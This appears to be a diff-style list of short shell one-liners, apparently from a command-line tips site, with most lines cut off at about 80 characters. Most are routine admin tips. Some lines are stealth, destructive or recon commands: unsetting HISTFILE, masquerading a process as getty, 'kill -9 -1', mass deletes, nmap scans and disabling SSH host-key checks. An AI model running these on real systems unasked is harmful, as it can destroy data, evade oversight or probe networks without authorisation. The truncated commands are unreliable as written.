+cd ~/.mozilla/firefox/ && sqlite3 `cat profiles.ini | grep Path | awk -F= '{prin
+cat count.txt | awk '{ sum+=$1} END {print sum}'
+^A ?
+nmap -sT -p 80 -oG - 192.168.1.* | grep open
+alias s='screen -X screen'; s top; s vi; s man ls;
+data:text/html, <html contenteditable>
+ffmpeg -i video.flv -vn -ar 44100 -ac 2 -ab 192k -f mp3 audio.mp3
+grep . *
+for i in ~/.adobe ~/.macromedia ; do ( rm $i/ -rf ; ln -s /dev/null $i ) ; done
+echo "dear admin, please ban eribsskog" | wall
+lsof -i -P | grep -i "listen"
+aptitude purge '~c'
+watch "netstat -plan|grep :80|awk {'print \$5'} | cut -d: -f 1 | sort | uniq -c
+echo -e "Some Text Line1\nSome Text Line 2" | convert -background none -density
+DISPLAY=":0.0" import -window root screenshot.png
+define(){ local y="$@";curl -sA"Opera" "http://www.google.com/search?q=define:${
+git log --format='%aN' | sort -u
+flight_status() { if [[ $# -eq 3 ]];then offset=$3; else offset=0; fi; curl "htt
+ssh -4 -C -c blowfish-cbc
+rename -v 's/.*[s,S](\d{2}).*[e,E](\d{2}).*\.avi/SHOWNAME\ S$1E$2.avi/' poorly.n
+column -s, -t <tmp.csv
+find ~/.mozilla/firefox/ -type f -name "*.sqlite" -exec sqlite3 {} VACUUM \;
+mount -t ntfs-3g -o ro,loop,uid=user,gid=group,umask=0007,fmask=0117,offset=0x$(
+lsof -Pni4 | grep LISTEN
+find -type f -exec md5sum '{}' ';' | sort | uniq --all-repeated=separate -w 33 |
+tmpfile=$(mktemp) && echo -e 'startup_message off\nscreen -t top htop\nsplit\nfo
+yes "$(seq 232 255;seq 254 -1 233)" | while read i; do printf "\x1b[48;5;${i}m\n
+echo {0..1}{0..1}{0..1}{0..1}
+bind '"\e[24~"':"\"ps -elF;df -h;free -mt;netstat -lnpt;who -a\C-m"""
+wget $URL | htmldoc --webpage -f "$URL".pdf - ; xpdf "$URL".pdf &
+sudo dd if=/dev/zero of=/swapfile bs=1024 count=1024000;sudo mkswap /swapfile; s
+mv $1 $2 && ln -s $2/$(basename $1) $(dirname $1)
+unset HISTFILE
+yes '' | cat -n
+startx -- `which Xvfb` :1 -screen 0 800x600x24 && DISPLAY=:1 x11vnc
+rsync --rsync-path 'sudo rsync' username@source:/folder/ /local/
+mysql --database=dbname -B -N -e "SHOW TABLES"  | awk '{print "ALTER TABLE", $1,
+echo -n 'text to be encrypted' | openssl md5
+tail -1000 /some/file | vim -
+ssh user@host cat /path/to/some/file | xclip
+nmap -sS -P0 -sV -O <target>
+find * -type d -exec mkdir /where/you/wantem/\{\} \;
+curl -I www.commandlinefu.com
+find . -type f | wc -l
+git commit -m "$(curl -s http://whatthecommit.com/index.txt)";
+qrencode -s 7 -o qr-wifi.png "WIFI:S:$(zenity --entry --text="Network name (SSID
+vi scp://username@host//path/to/somefile
+fuser -v 80/tcp
+echo $((0x1fe)) $((033))
+man -t awk | ps2pdf - awk.pdf
+echo 'obase=60;299' | bc
+du -h /path | sort -h
+strace -ff -e trace=file my_command 2>&1 | perl -ne 's/^[^"]+"(([^\\"]|\\[\\"nt]
+find -L / -samefile /path/to/file -exec ls -ld {} +
+for h in `find /proc/*/fd -ilname "/tmp/Flash*" 2>/dev/null`; do ln -s "$h" `rea
+rsync --progress --partial --rsh="ssh -p 8322" --bwlimit=100 --ipv4 user@domain.
+echo 213.251.145.96 wikileaks.com >>/etc/hosts
+sudo -K
+lftp -e "mirror -c" http://example.com/foobar/
+:w !curl -F "sprunge=<-" http://sprunge.us | xclip
+printf "%`tput cols`s"|tr ' ' '#'
+sudo apt-get -o Acquire::http::Dl-Limit=30 upgrade
+wget -qO - http://example.com/path/to/blah.tar.gz | tar xzf -
+vimdiff scp://root@server-foo.com//etc/snmp/snmpd.conf scp://root@server-bar.com
+for n in E2 A2 D3 G3 B3 E4;do play -n synth 4 pluck $n repeat 2;done
+tar cf - <dir>|split -b<max_size>M - <name>.tar.
+chmod -R -x+X *
+for c in `seq 0 255`;do t=5;[[ $c -lt 108 ]]&&t=0;for i in `seq $t 5`;do echo -e
+env PS4=' ${BASH_SOURCE}:${LINENO}(${FUNCNAME[0]}) ' sh -x /etc/profile
+wget --reject html,htm --accept pdf,zip -rl1 url
+cat /var/log/secure.log | awk '{print substr($0,0,12)}' | uniq -c | sort -nr | a
+PS1="\`if [ \$? = 0 ]; then echo \e[33\;40m\\\^\\\_\\\^\e[0m; else echo \e[36\;4
+tail -f FILE | perl -pe 's/KEYWORD/\e[1;31;43m$&\e[0m/g'
+clfu-seach <search words>
+sudo firefox -install-global-extension /path/to/add-on
+CTRL+u
+RETURN~.
+ssh user@host 'mysqldump dbname | gzip' > /path/to/backups/db-backup-`date +%Y-%
+wget --recursive  --page-requisites --convert-links www.moyagraphix.co.za
+MAC=`(date; cat /proc/interrupts) | md5sum | sed -r 's/^(.{10}).*$/\1/; s/([0-9a
+find . -name "*.php" -exec iconv -f ISO-8859-1 -t UTF-8 {} -o ../newdir_utf8/{}
+#!/usr/bin/sudo /bin/bash
+arch
+namei -m $(pwd)
+shopt -s autocd
+exec -a "/sbin/getty 38400 tty7" your_cmd -erase_all_files
+ssh-keygen -R <thehost>
+cp httpd.conf{,.bk}
+find . -type f -printf '%TY-%Tm-%Td %TT %p\n' | sort
+netstat -lantp | grep ESTABLISHED |awk '{print $5}' | awk -F: '{print $1}' | sor
+echo $0
+wget http://URL/FILE.tar.gz -O - | tar xfz -
+du -hs */ | sort -hr | head
+rename 's/\.jpe?g$/.jpg/i' *
+check(){ curl -sI $1 | sed -n 's/Location: *//p';}
+yt () mplayer -fs -quiet $(youtube-dl -g "$1")
+openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/.$//'
+find ./ -name Thumbs.db -delete
+lsof +L1
+# dd if=/dev/mem bs=1k skip=768 count=256 2>/dev/null | strings -n 8
+xdg-open [path]
+!:1-3
+sudo lsof -u someuser -a +D /etc
+!!:[position]
+zenity --list --width 500 --height 500 --column 'radio' --column 'url' --print-c
+killall -INFO dd
+ssh root@host1 "cd /somedir/tocopy/ && tar -cf - ." | ssh root@host2 "cd /samedi
+for file in *.flac; do flac -cd "$file" | lame -q 0 --vbr-new -V 0 - "${file%.fl
+find . -type f -exec sed -i s/oldstring/newstring/g {} +
+stty sane
+grep 'test' somefile | grep -vE '(error|critical|warning)'
+(some_command 2>&1 1>&3 | tee /path/to/errorlog ) 3>&1 1>&2 | tee /path/to/stdou
+awk 'length>72' file
+make -j 4
+svn ls -R | egrep -v -e "\/$" | xargs svn blame | awk '{print $2}' | sort | uniq
+awk '{print NR": "$0; for(i=1;i<=NF;++i)print "\t"i": "$i}'
+svn diff <file> | vim -R -
+ls | curl -F 'sprunge=<-' http://sprunge.us | xclip
+for k in `git branch|perl -pe s/^..//`;do echo -e `git show --pretty=format:"%Cg
+type -all command
+who -b
+curl -s http://checkip.dyndns.org/ | grep -o "[[:digit:].]\+"
+egrep -v "^$|^[[:space:]]*#" /etc/some/file
+screen -d -m [<command>]
+sed 's/\o0/\n/g' /proc/INSERT_PID_HERE/environ
+curl dict://dict.org/d:something
+diff <(ssh alice cat /etc/apt/sources.list) <(ssh bob cat /etc/apt/sources.list)
+Ctrl+S Ctrl+Q
+detox -r -s utf_8 /path/to/old/win/files/dir
+mkdir -p doc/{text/,img/{wallpaper/,photos/}}
+ssh -fX <user>@<host> <program>
+:g!/\S/d
+lsof +p xxxx
+sudo dd if=/dev/sda of=/media/disk/backup/sda.backup
+du --max-depth=1 | sort -r -n | awk '{split("k m g",v); s=1; while($1>1024){$1/=
+cd `pwd -P`
+find . -type d -name '.svn' -print0 | xargs -0 rm -rdf
+exec 5<>/dev/tcp/time.nist.gov/13; cat <&5 & cat >&5; exec 5>&-
+soffice --headless -convert-to odt:"writer8" somefile.docx
+top -p $(pgrep -d , foo)
+hourglass(){ trap 'tput cnorm' 0 1 2 15 RETURN;local s=$(($SECONDS +$1));(tput c
+ctrl+w
+<ctrl+e> <esc+t>
+lsmod | awk 'BEGIN{print "digraph{"}{split($4, a, ","); for (i in a) print $1, "
+echo "export LESS_TERMCAP_mb=$'\E[01;31m'" >> ~/.bashrc
+!ssh:p
+manswitch () { man $1 | less -p "^ +$2"; }
+compgen -c | sort -u > commands
+cd <directory>; touch ./-i
+while [ /bin/true ]; do OLD=$NEW; NEW=`cat /proc/net/dev | grep eth0 | tr -s ' '
+<ESC> v
+!$
+ethtool -p eth0
+j=0;while true; do let j=$j+1; for i in $(seq 0 20 100); do echo $i;sleep 1; don
+@reboot <yourscript.sh>
+echo "uptime" | pee "ssh host1" "ssh host2" "ssh host3"
+while true; do inotifywait -r -e MODIFY dir/ && make; done;
+dd bs=1k if=image.nrg of=image.iso skip=300
+export PS1="C:\$( pwd | sed 's:/:\\\\\\:g' )\\> "
+lsof -r 2 -p PID -i -a
+rsync --progress file1 file2
+ruler() { for s in '....^....|' '1234567890'; do w=${#s}; str=$( for (( i=1; $i<
+perl -le 'print $!+0, "\t", $!++ for 0..127'
+pwgen -Bs 10 1
+function man2pdf(){ man -t ${1:?Specify man as arg} | ps2pdf -dCompatibility=1.3
+Ctrl-R <search-text>
+echo $PATH | tr \: \\n
+exiftool '-Directory<DateTimeOriginal' -d %Y/%m/%d dir
+tail -F file
+man ls | col -b > ~/Desktop/man_ls.txt
+ifstat -nt
+( cat badfile.log ; tac badfile.log | tac ) > goodfile.log
+sudo cat /dev/vcs1 | fold -w 80
+curl -u username -o bookmarks.xml https://api.del.icio.us/v1/posts/all
+< /path/to/file.txt grep foo
+base64 -d <<< aHR0cDovL3d3dy50d2l0dGVyc2hlZXAuY29tL3Jlc3VsdHMucGhwP3U9Y29tbWFuZG
+xvkbd -xsendevent -text "Hello world"
+convert -font -misc-fixed-*-*-*-*-*-*-*-*-*-*-*-* -fill black -draw "text 270,26
+sudo cat /proc/kcore | strings | awk 'length > 20' | less
+git commit --amend
+date -d '2 weeks ago Saturday' +%Y-%m-%d
+tcpdump -nn -v -i eth0 -s 1500 -c 1 'ether[20:2] == 0x2000'
+^r in bash begins a reverse-search-history with command completion
+ffmpeg -i video.avi -f mp3 audio.mp3
+last  | grep -v "^$" | awk '{ print $1 }' | sort -nr | uniq -c
+sudo dmidecode | grep Serial\ Number | head -n1
+nmap -sP 192.168.1.100-254
+file !$
+netstat -plunt
+curl -s https://api.github.com/users/<username>/repos?per_page=1000 |grep git_ur
+: </dev/tcp/127.0.0.1/80
+ps -fC PROCESSNAME
+kpartx -av <image-flat.vmdk>; mount -o /dev/mapper/loop0p1 /mnt/vmdk
+wget -r -l1 -H -t1 -nd -N -np -A.mp3 -erobots=off [url of website]
+t2s() { wget -q -U Mozilla -O $(tr ' ' _ <<< "$1"| cut -b 1-15).mp3 "http://tran
+php -S 127.0.0.1:8080
+read && ffmpeg -y -r 1 -t 3 -f video4linux2 -vframes 1 -s sxga -i /dev/video0 ~/
+du -h --max-depth=1 |sort -rh
+shopt -s histverify
+say() { mplayer "http://translate.google.com/translate_tts?q=$1"; }
+find . -name \*.php -exec php -l "{}" \;
+read -s -p"Password: " USER_PASSWORD_VARIABLE; echo
+watch vmstat -sSM
+ff() { local IFS='|'; grep -rinE "$*" . ; }
+sleep 3s && espeak "wake up, you bastard" 2>/dev/null
+gdb -batch -ex "run" -ex "bt" ${my_program} 2>&1 | grep -v ^"No stack."$
+curl -n --ssl-reqd --mail-from "<user@gmail.com>" --mail-rcpt "<user@server.tld>
+echo "uptime" | tee >(ssh host1) >(ssh host2) >(ssh host3)
+dmidecode -t bios
+history | awk '{a[$2]++}END{for(i in a){print a[i] " " i}}' | sort -rn | head >
+pkill -x firefox
+for i in {1..254}; do ping -c 1 -W 1 10.1.1.$i | grep 'from'; done
+mkisofs -J -allow-lowercase -R -V "OpenCD8806" -iso-level 4 -o OpenCD.iso ~/Open
+xvkbd -xsendevent -text $(date +%Y%m%d)
+curl -u twitter-username -d status="Hello World, Twitter!" -d source="cURL" http
+path_stripped_programname="${0##*/}"
+wget -q -O - `youtube-dl -b -g $url`| ffmpeg -i - -f mp3 -vn -acodec libmp3lame
+sleeper(){ while `ps -p $1 &>/dev/null`; do echo -n "${2:-.}"; sleep ${3:-1}; do
+diff <(ssh server01 'cd config; find . -type f -exec md5sum {} \;| sort -k 2') <
+rename -v 's/ /_/g' *
+echo "${PATH//:/$'\n'}"
+rsync -az /home/user/test user@sshServer:/tmp/
+find . -empty -type d -exec rmdir {} +
+sed -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' | xargs echo -e
+echo '{"json":"obj"}' | python -m simplejson.tool
+wajig large
+watch -n 1 "netstat -tpanl | grep ESTABLISHED"
+sudo killall -9 pulseaudio; pulseaudio >/dev/null 2>&1 &
+while true; do [ "$(ping -c1W1w1 server-or-ip.com | awk '/received/ {print $4}')
+netstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n
+seq 50| awk 'BEGIN {a=1; b=1} {print a; c=a+b; a=b; b=c}'
+convert -colors 256 -resize 16x16 face.jpg face.ppm && ppmtowinicon -output favi
+sudo dmidecode --type 17 | more
+firefox -no-remote -P
+sort -nt . -k 1,1 -k 2,2 -k 3,3 -k 4,4
+rsync --partial --progress --rsh=ssh SOURCE DESTINATION
+curl -s http://checkip.dyndns.org | sed 's/[a-zA-Z<>/ :]//g'
+cat .ssh/id_rsa.pub | ssh hostname 'cat >> .ssh/authorized_keys'
+yes "$(seq 232 255;seq 254 -1 233)" | while read i; do printf "\x1b[48;5;${i}m\n
+tar czv file1 file2 folder1 | ssh user@server tar zxv -C /destination
+Ctrl + Alt
+function google { Q="$@"; GOOG_URL='https://www.google.de/search?tbs=li:1&q='; A
+ps axu | grep [a]pache2
+pscp -h hosts.txt -l username /etc/hosts /tmp/hosts
+while ( nc -l 80 < /file.htm > : ) ; do : ; done &
+ssh  -t remotebox "tail -f /var/log/remote.log"
+t=$(df|awk 'NR!=1{sum+=$2}END{print sum}');sudo du / --max-depth=1|sed '$d'|sort
+convert -resize '1024x600^' image.jpg small-image.jpg
+getent services <<service>>
+oowriter -pt pdf your_word_file.doc
+diffxml() { diff -wb <(xmllint --format "$1") <(xmllint --format "$2"); }
+lsof +D <dirname>
+apt-get install `ssh root@host_you_want_to_clone "dpkg -l | grep ii" | awk '{pri
+cls(){ printf "\33[2J";} or, if no printf, cat >cls;<ctrl-v><ctrl+[>[2J<enter><c
+down4me() { wget -qO - "http://www.downforeveryoneorjustme.com/$1" | sed '/just
+echo "?????, these are the umlauted vowels I sing to you. Oh, and sometimes ?, b
+cmp file1 file2
+curl --user login:password -o DeliciousBookmarks.xml -O 'https://api.del.icio.us
+ssh root@HOST tcpdump -U -s0 -w - 'not port 22' | wireshark -k -i -
+for i in {0..600}; do echo $i; sleep 1; done | dialog --gauge "Install..." 6 40
+lynx -dump http://www.domain.com | awk '/http/{print $2}'
+sudo arp-scan -I eth0 192.168.1.0/24
+echo -ne "<shellcode>" | x86dis -e 0 -s intel
+compgen -A function
+screen -raAd
+export FIGNORE=.svn
+wget randomfunfacts.com -O - 2>/dev/null | grep \<strong\> | sed "s;^.*<i>\(.*\)
+tar jcpf - [sourceDirs] |ssh user@host "cat > /path/to/backup/backupfile.tar.bz2
+pronounce(){ wget -qO- $(wget -qO- "http://dictionary.reference.com/browse/$@" |
+purple-remote "setstatus?status=away&message=AFK"
+grepp() { [ $# -eq 1 ] && perl -00ne "print if /$1/i" || perl -00ne "print if /$
+^W-L
+A=1;B=100;X=0;C=0;N=$[$RANDOM%$B+1];until [ $X -eq $N ];do read -p "N between $A
+trash <file>
+ps aux --sort=%mem,%cpu
+sitepass() { echo -n "$@" |  md5sum | sha1sum | sha224sum | sha256sum | sha384su
+su -- user
+apropos network |more
+<Shift + W>
+hdparm -t /dev/sda
+URL="http://www.google.com";curl -L --w "$URL\nDNS %{time_namelookup}s  conn %{t
+python -c 'import this'
+<ctrl+j>stty sane<ctrl+j>
+ifconfig -a | perl -nle'/(\d+\.\d+\.\d+\.\d+)/ && print $1'
+cat /dev/clipboard; $(somecommand) > /dev/clipboard
+rsync -rtvu --modify-window=1 --progress /media/SOURCE/ /media/TARGET/
+lsof -i
+find . -name "*jpg" -exec jpeginfo -c {} \; | grep -E "WARNING|ERROR"
+cat typescript | perl -pe 's/\e([^\[\]]|\[.*?[a-zA-Z]|\].*?\a)//g' | col -b > ty
+screen -x
+sudo aptitude purge `dpkg --get-selections | grep deinstall | awk '{print $1}'`
+hwinfo --block --short
+awk '/sshd/ && /Failed/ {gsub(/invalid user/,""); printf "%-12s %-16s %s-%s-%s\n
+gs -q -sPAPERSIZE=letter -dNOPAUSE -dBATCH -sDEVICE=pdfwrite -sOutputFile=out.pd
+somecommand 2>&1 >> logfile | tee -a logfile
+for i in *.html ; do mv $i ${i%.html}.htm ; done
+sed -i 8d ~/.ssh/known_hosts
+:r !command
+autossh -f -M 20000 -D 8000 somehost -N
+find . -type l ! -exec test -e {} \; -print
+while [ ! -f /tmp/stop ]; do ssh -o ExitOnForwardFailure=yes -R 2222:localhost:2
+fuser [portnumber]/[proto]
+wget -O - http://www.commandlinefu.com/commands/browse/rss 2>/dev/null | awk '/\
+svn status |grep '\?' |awk '{print $2}'| xargs svn add
+sudo -s <<< 'apt update -y && apt upgrade -y'
+while true; do printf "\e[38;5;$(($(od -d -N 2 -A n /dev/urandom)%$(tput colors)
+sudo tune2fs -l $(df -h / |(read; awk '{print $1; exit}')) | grep -i created
+curl -s http://www.census.gov/popclock/data/population/world | python -c 'import
+ps -eo pid,lstart,cmd
+rsync -aHAXxv --numeric-ids --delete --progress -e "ssh -T -c arcfour -o Compres
+tr -cd '1-6' < /dev/urandom | head -c 1; echo
+screen -D -R
+command <<< word
+for i in {1..30}; do  ping -t $i -c 1 google.com; done | grep "Time to live exce
+sudo dmidecode | grep Product
+tar -xaf archive.tar.gz --strip-components=1
+awk '{gsub("foo","bar",$5)}1' file
+while inotifywait -e modify /tmp/myfile; do firefox; done
+multitail -l 'ssh machine1 "tail -f /var/log/apache2/error.log"' -l 'ssh machine
+var='123456789'; echo ${var:<start_pos>:<offset>}
+while true ; do nc -l 80  < index.html ; done
+ssh -f -L3389:<RDP_HOST>:3389 <SSH_PROXY> "sleep 10" && rdesktop -T'<WINDOW_TITL
+rename 's/\d+/sprintf("%04d",$&)/e' *.jpg
+echo "${0%/*}"
+ssh user@remote-host "DISPLAY=:0.0 import -window root -format png -"|display -f
+say(){ mplayer -user-agent Mozilla "http://translate.google.com/translate_tts?tl
+!!command
+<ALT>+<.> or <ALT>+<NUM>+<.> or <ALT>+<NUM>,<ALT>+<.>
+dpkg -S $( which  ls )
+egrep -i "^[0-9a-f]{4,} .*$*" $(locate CharName.pm) | while read h d; do /usr/bi
+dd if=/path/inputfile | pv | dd of=/path/outpufile
+Confirm() { read -sn 1 -p "$1 [Y/N]? "; [[ $REPLY = [Yy] ]]; }
+ffmpeg -y -f alsa -ac 2 -i pulse -f x11grab -r 30 -s `xdpyinfo | grep 'dimension
+echo $(openssl rand 4 | od -DAn)
+kill -9 -1
+sudo chattr +i <file>
+<ctrl+z> bg
+wtf is <acronym>
+:set ff=unix
+url=http://www.youtube.com/watch?v=V5bYDhZBFLA; youtube-dl -b $url; mplayer $(ls
+sed -n '4{p;q}'
+sed -n '4p'
+find . -iname '*.jpg' -exec echo '<img src="{}">' \; > gallery.html
+wget -qO- icanhazip.com
+MIN=1 && for i in $(seq $(($MIN*60)) -1 1); do echo -n "$i, "; sleep 1; done; ec
+grep -Fxv -f file1 file2
+curl -s "http://feeds.delicious.com/v2/json?count=5" | python -m json.tool | les
+pydoc -p 8888 & gnome-open http://localhost:8888
+gs -sDEVICE=pdfwrite -dCompatibilityLevel=1.4 -dPDFSETTINGS=/screen -dNOPAUSE -d
+ls /usr/bin | xargs whatis | grep -v nothing | less
+<ALT> .
+while true; do echo -ne "$(date)\r"; sleep 1; done
+ssh <host> 'tar -cz /<folder>/<subfolder>' | tar -xvz
+calc(){ awk "BEGIN{ print $* }" ;}
+dd if=/dev/sda | ssh user@server 'dd of=sda.img'
+find /proc -user myuser -maxdepth 1 -type d -mtime +7 -exec basename {} \; | xar
+echo "vertical text" | grep -o '.'
+cat /var/lib/dpkg/info/*.list > /tmp/listin ; ls /proc/*/exe |xargs -l readlink
+rename 's/^/prefix/' *
+shuf -n1 file.txt
+for x in `jot - 0 2400 25`; do curl "http://www.commandlinefu.com/commands/brows
+dos2unix <filenames>
+find -L /proc/*/fd -links 0 2>/dev/null
+ssh -f -N -L 5432:talk.google.com:5222 user@home.network.com
+find <directory path> -mtime +365 -and -not -type d -delete
+for f in *.flv; do ffmpeg -y -i "$f" -f image2 -ss 10 -vframes 1 -an "${f%.flv}.
+fold -s -w 90 file.txt
+grep -i --color=auto
+!}sort
+grep --color=auto -iRnH "$search_word" $directory
+alias timestamp='date "+%Y%m%dT%H%M%S"'
+ps aux | grep "[s]ome_text"
+netstat -anp |grep 'tcp\|udp' | awk '{print $5}' | sed s/::ffff:// | cut -d: -f1
+rename .oldextension .newextension *.oldextension
+svn st | cut -c 8- | sed 's/^/\"/;s/$/\"/' | xargs tar -czvf ../backup.tgz
+echo SSBMb3ZlIFlvdQo= | base64 -d
+awk '/pattern1/ && /pattern2/ && !/pattern3/ {print}'
+iptables -A INPUT -s 222.35.138.25/32 -j DROP
+find /path/to/dir -type f -print0 | xargs -0 rm
+rsync -a --delete empty-dir/ target-dir/
+du -x --max-depth=1|sort -rn|awk -F / -v c=$COLUMNS 'NR==1{t=$1} NR>1{r=int($1/t
+cp foo{,bak}
+hping3 10.0.2.254 --icmp --sign MSGID1 -d 50 -c 1 --file a_file
+<Return>~.
+ruby -ryaml -rjson -e 'puts YAML.dump(JSON.parse(STDIN.read))' < file.json > fil
+ALT-U / ALT-L
+perl -e '$|++; while (1) { print " " x (rand(35) + 1), int(rand(2)) }'
+vim -O file1 file2
+watch -n 1 "do foo"
+find . -type f -print0 | xargs -0 du -h | sort -hr | head -20
+brew update && brew upgrade `brew outdated`
+xloadimage <(ssh USER@HOSTNAME DISPLAY=:0.0 import -window root png:-)
+cat /proc/PID/limits
+:w !diff -u % -
+tar xfz filename.tar.gz -C PathToDirectory
+seq 9 | sed 'H;g' | awk -v RS='' '{for(i=1;i<=NF;i++)printf("%dx%d=%d%s", i, NR,
+IFS=$'\n' && for f in `find . -type f -exec md5sum "{}" \;`; do echo $f | sed -r
+imgur(){ $*|convert label:@- png:-|curl -F "image=@-" -F "key=1913b4ac473c692372
+gpg --gen-random --armor 1 30
+pkill -KILL -u username
+fsck.ext4 -cDfty -C 0 /dev/sdxx
+shuf -n1 -e *
+lsmac() { ifconfig -a | sed '/eth\|wl/!d;s/   Link.*HWaddr//' ; }
+ssh -NR 0.0.0.0:2222:127.0.0.1:22 user@jump.host.com
+MIN=10;for ((i=MIN*60;i>=0;i--));do echo -ne "\r$(date -d"0+$i sec" +%H:%M:%S)";
+find . -type f | awk -F'.' '{print $NF}' | sort| uniq -c | sort -g
+curl -I http://localhost
+:%!xxd
+ssh-keygen -l -f ~/.ssh/known_hosts
+kill -9 `ps -xaw -o state -o ppid | grep Z | grep -v PID | awk '{print $2}'`
+echo rm *.txt
+awk '{ $5=""; print }' file
+curl ifconfig.me
+for i in `seq 0 100`;do timeout 6 dialog --gauge "Install..." 6 40 "$i";done
+:> file
+DISPLAY=:0.0 XAUTHORITY=~/.Xauthority notify-send test
+screen /dev/tty<device> 9600
+:%d
+cat WAR_AND_PEACE_By_LeoTolstoi.txt | tr -cs "[:alnum:]" "\n"| tr "[:lower:]" "[
+who loves mum
+twistd -n web --path .
+rdesktop -a24 -uAdministrator -pPassword  -r clipboard:CLIPBOARD -r disk:share=~
+scp -l10 pippo@serverciccio:/home/zutaniddu/* .
+pv /dev/zero|ssh $host 'cat > /dev/null'
+while [ 1 ]; do banner 'ze missiles, zey are coming! ' | while IFS="\n" read l;
+cpan -r
+find /path/to/dir -type f -delete
+sed -i '/myexpression/d' /path/to/file.txt
+dpigs
+find . -name "whatever.*" -print0 | rsync -av --files-from=- --from0 ./ ./destin
+AUTOSSH_POLL=1 autossh -M 21010 hostname -t 'screen -Dr'
+arecord -q -f cd -r 44100 -c2 -t raw | lame -S -x -h -b 128 - `date +%Y%m%d%H%M`
+yes "$(seq 1 255)" | while read i; do printf "\x1b[48;5;${i}m\n"; sleep .01; don
+wget -nv http://en.wikipedia.org/wiki/Linux -O- | egrep -o "http://[^[:space:]]*
+tar -cf - /home/user/test | gzip -c | ssh user@sshServer 'cd /tmp; tar xfz -'
+pgrep -u `id -u` firefox-bin || find ~/.mozilla/firefox -name '*.sqlite'|(while
+$ vim ... :help 42
+pgrep command_name
+id="dMH0bHeiRNg";mplayer -fs http://youtube.com/get_video.php?video_id=$id\&t=$(
+column -t /proc/mounts
+echo "Body goes here" | mutt -s "A subject" -a /path/to/file.tar.gz recipient@ex
+echo <ctrl-v><esc>c<enter>
+curl -u user -d status="Tweeting from the shell" http://twitter.com/statuses/upd
+complete -W "$(echo $(grep '^ssh ' .bash_history | sort -u | sed 's/^ssh //'))"
+ifconfig | perl -nle'/dr:(\S+)/ && print $1'
+:let i=0 | 'a,'bg/ZZZZ/s/ZZZZ/\=i/ | let i=i+1
+readlink -f ../super/symlink_bon/ahoy
+tar czv Pictures | split -d -a 3 -b 16M - pics.tar.gz.
+echo $?
+shopt -s globstar
+for file in <directory A>/*; do rm <directory B>/`basename $file`; done
+curl -s 'http://download.finance.yahoo.com/d/quotes.csv?s=csco&f=l1'
+read -p "Which station? "; mplayer --reallyquiet -vo none -ao sdl http://somafm.
+cd $(dirname $(find ~ -name emails.txt))
+sed -r 's/([a-z]+)([A-Z][a-z]+)/\1_\l\2/g' file.txt
+echo "screen -DR" >> ~/.bash_profile
+mplayer -framedrop -vfm ffmpeg -lavdopts lowres=1:fast:skiploopfilter=all
+mkdir $(date +%Y%m%d)
+watch "dmesg |tail -15"
+dpkg --get-selections > LIST_FILE
+lsof -P | grep ':3000'
+fc [history-number]
+ctrl-z
+for i in $(ls *.od{tp}); do unoconv -f pdf $i; done
+touch {1..10}.txt
+du -cs * .[^\.]* | sort -n
+find -name '*wma' -exec ffmpeg -i {} -acodec vorbis -ab 128k {}.ogg \;
+cat /etc/*-release
+< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c6
+echo foo bar foobar barfoo && echo !$ !^  !:3 !* &&  echo /usr/bin/foobar&& echo
+find  ./  -name '*'  -exec  rename  's/\s+/_/g'  {}  \;
+sed -e "/$USER/d;s/:.*//g" /etc/group | sed -e :a -e '/$/N;s/\n/ /;ta'
+du -sh *
+openssl speed md5
+awk '{ $1="";print}'
+base64 /dev/urandom | head -c 33554432 | split -b 8192 -da 4  - dummy.
+!:n
+!!; while [ $? -ne 0 ]; do !!; done
+echo "main(i){for(i=0;;i++)putchar(((i*(i>>8|i>>9)&46&i>>8))^(i&i>>13|i>>6));}"
+color()(set -o pipefail;"$@" 2>&1>&3|sed $'s,.*,\e[31m&\e[m,'>&2)3>&1
+find . -name '*.rar' -execdir unrar e {} \;
+ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no username@host
+find . -maxdepth 1 -size 0c -delete
+pv -tpreb /dev/urandom | dd of=file.img
+step1 ; step2 ; step3 ; step4 ; curl -o- --get 'https://stream.twitter.com/1/sta
+step4() { oauth_header="Authorization: OAuth oauth_consumer_key=\"$k1\", oauth_n
+step2(){ b="GET&https%3A%2F%2Fstream.twitter.com%2F1%2Fstatuses%2Ffilter.json&fo
+step3() { s=$(echo -n $b | openssl dgst -sha1 -hmac $hmac -binary | openssl base
+aspell -a <<< '<WORDS>'
+find / -type f -size +500M -size -1G
+while true; do cat /proc/net/dev; sleep 1; done | awk -v dc="date \"+%T\"" '/eth
+touch -d $(zenity --calendar --date-format=%F) filename
+sort -g -o list.txt{,}
+$ history -a #in one shell , and $ history -r #in another running shell
+diff -rq dirA dirB
+rsync -rv <src> <dst> --progress
+read day month year < <(date +'%d %m %y')
+cat /sys/class/net/eth0/address
+for i in ./*foo*;do mv -- "$i" "${i//foo/bar}";done
+dd if=/dev/zero of=testfile.seek seek=5242879 bs=1 count=1
+alias screensaver='for ((;;)); do echo -ne "\033[$((1+RANDOM%LINES));$((1+RANDOM
+alias rot13="tr a-zA-Z n-za-mN-ZA-M"
+script /tmp/log.txt
+find . -size +100000k -exec du -h {} \;
+alias vim="vim -p"
+perl -wlne'/title>([^<]+)/i&&rename$ARGV,"$1.html"' *.html
+tar -czvf - /src/dir | ssh remotehost "(cd /dst/dir ; tar -xzvf -)"
+Ctrl + [
+perl -e 'for(;;){@d=split("",`date +%H%M%S`);print"\r";for(0..5){printf"%.4b ",$
+read -a ARR <<<'world domination now!'; echo ${ARR[2]};
+md5sum <<<"test"
+parallel -j+0 "zcat {} | bzip2 >{.}.bz2 && rm {}" ::: *.gz
+php -i
+atb() { l=$(tar tf $1); if [ $(echo "$l" | wc -l) -eq $(echo "$l" | grep $(echo
+while [ true ]; do head -n 100 /dev/urandom; sleep .1; done | hexdump -C | grep
+ssh -C -Y -l$USER xserver.mynet.xx 'Xnest -geometry 1900x1150 -query localhost'
+find -type l -xtype d
+fortune | cowsay -f $(ls /usr/share/cowsay/cows/ | shuf -n1)
+cat my.ps | nc -q 1 hp4550.mynet.xx 9100
+cat /etc/*release
+d="www.dafont.com/alpha.php?";for c in {a..z}; do l=`curl -s "${d}lettre=${c}"|s
+tail -f access.log | pv -l -i10 -r >/dev/null
+strace -ff -e write=1,2 -s 1024 -p PID  2>&1 | grep "^ |" | cut -c11-60 | sed -e
+while :;do killall -USR1 dd;sleep 1;done
+dmidecode -t 17 | awk -F":" '/Speed/ { print $2 }'
